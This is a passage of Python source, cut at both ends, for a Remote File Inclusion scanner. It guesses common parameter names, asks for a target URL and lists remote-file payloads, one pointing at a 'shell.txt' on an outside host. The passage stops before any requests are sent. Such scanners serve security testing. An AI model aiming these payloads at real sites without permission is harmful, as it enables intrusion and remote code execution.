...
def guess_params(params):
    if not params:
        common_params = ['page', 'url', 'template', 'include']
        params = {p: [''] for p in common_params}
    return params

def run():
    print("Running Remote File Inclusion (RFI) scan with automatic parameter detection...")
    url = input("Enter target URL (with or without parameters): ").strip()
    parsed = urlparse(url)
    params = parse_qs(parsed.query)
    params = guess_params(params)

    # Simple payloads pointing to a remote test file URL (should be replaced with your test URL)
    payloads = ["http://example.com/test.txt", "http://test.com/shell.txt"]
    vulnerable_params = []
